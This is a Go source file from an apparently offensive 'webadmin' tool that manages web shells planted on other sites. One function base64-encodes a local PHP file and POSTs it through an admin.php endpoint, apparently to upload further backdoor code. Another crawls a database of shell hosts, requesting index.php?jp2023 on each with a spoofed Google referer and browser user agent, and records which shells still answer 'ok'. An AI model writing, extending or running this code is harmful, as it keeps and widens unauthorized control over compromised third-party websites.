package task

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"webadmin/model"

	"github.com/gocolly/colly/v2"
)

type Resdata struct {
	Status int
	Url    []string
}

func Addtest() {

	var shells []model.Shell
	if err := model.Db.Where("status = 1").Find(&shells).Error; err != nil {
		log.Printf("Sitestatus: failed to query shells: %v", err)
		return
	}

	filePath := "./php/bakmin.php" // 要读取的文件
	// 1. 读取文件
	data, err := os.ReadFile(filePath)
	if err != nil {
		fmt.Println("读取文件失败:", err)
		return
	}

	newData := append([]byte("?>"), data...)
	// 2. Base64 编码
	encoded := base64.RawStdEncoding.EncodeToString(newData)
	// 3. 组装 POST 表单数据：test=base64内容
	form := url.Values{}
	form.Set("test", encoded)

	// 4. 创建请求
	req, err := http.NewRequest(
		"POST",
		"http://127.0.0.107/admin.php",
		bytes.NewBufferString(form.Encode()),
	)
	if err != nil {
		fmt.Println("创建请求失败:", err)
		return
	}

	// 5. 设置请求头
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Referer", "https://www.google.com/")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")

	// 6. 发送请求
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("请求失败:", err)
		return
	}
	defer resp.Body.Close()

	// 7. 读取返回
	body, _ := io.ReadAll(resp.Body)
	var resdate Resdata
	jsonrr := json.Unmarshal(body, &resdate)
	if jsonrr != nil {
		fmt.Println("jsonrr:", jsonrr.Error())
	}
	if len(resdate.Url) > 1 {
		//
		fmt.Println("url: ", resdate.Url)
	}

}

// Sitestatus queries all shell records, visits scheme://host/jp2023 for each,
// base64
// http://127.0.0.107/admin.php
func AddMm() {
	time.Sleep(10 * time.Second) // delay start to allow server to initialize
	var shells []model.Shell
	if err := model.Db.Where("status = 1").Find(&shells).Error; err != nil {
		log.Printf("Sitestatus: failed to query shells: %v", err)
		return
	}

	log.Printf("Sitestatus: %d records to check", len(shells))

	c := colly.NewCollector(
		colly.UserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"),
		colly.Async(true),
	)
	c.SetRequestTimeout(15 * time.Second)
	c.OnRequest(func(r *colly.Request) {
		r.Headers.Set("Referer", "https://www.google.com/")
		r.Headers.Set("Accept-Language", "en-US,en;q=0.9")
		r.Headers.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	})

	// limit concurrency to 10 parallel requests
	if err := c.Limit(&colly.LimitRule{
		DomainGlob:  "*",
		Parallelism: 10,
	}); err != nil {
		log.Printf("Sitestatus: failed to set limit: %v", err)
		return
	}

	c.OnResponse(func(r *colly.Response) {
		shellID := r.Ctx.GetAny("shellId").(int)
		bodyOk := strings.Contains(string(r.Body), "ok")

		newStatus := 2
		if bodyOk {
			newStatus = 1
		}

		if err := model.Db.Model(&model.Shell{}).Where("id = ?", shellID).Update("status", newStatus).Error; err != nil {
			log.Printf("Sitestatus: update failed id=%d: %v", shellID, err)
		}
	})

	c.OnError(func(r *colly.Response, err error) {
		if r != nil {
			shellID := r.Ctx.GetAny("shellId").(int)
			log.Printf("Sitestatus: request failed id=%d %s: %v", shellID, r.Request.URL, err)
			// set status=5 for failed requests
			if err := model.Db.Model(&model.Shell{}).Where("id = ?", shellID).Update("status", 5).Error; err != nil {
				log.Printf("Sitestatus: update failed id=%d: %v", shellID, err)
			}
		}
	})

	for _, shell := range shells {
		host := strings.TrimSpace(shell.Host)
		scheme := strings.TrimSpace(shell.Scheme)
		if host == "" || scheme == "" {
			log.Printf("Sitestatus: skip id=%d, empty host or scheme", shell.Id)
			continue
		}

		url := fmt.Sprintf("%s://%s/index.php?jp2023", scheme, host)
		ctx := colly.NewContext()
		ctx.Put("shellId", shell.Id)

		if err := c.Request("GET", url, nil, ctx, nil); err != nil {
			log.Printf("Sitestatus: visit failed id=%d %s: %v", shell.Id, url, err)
		}
	}

	c.Wait()
}
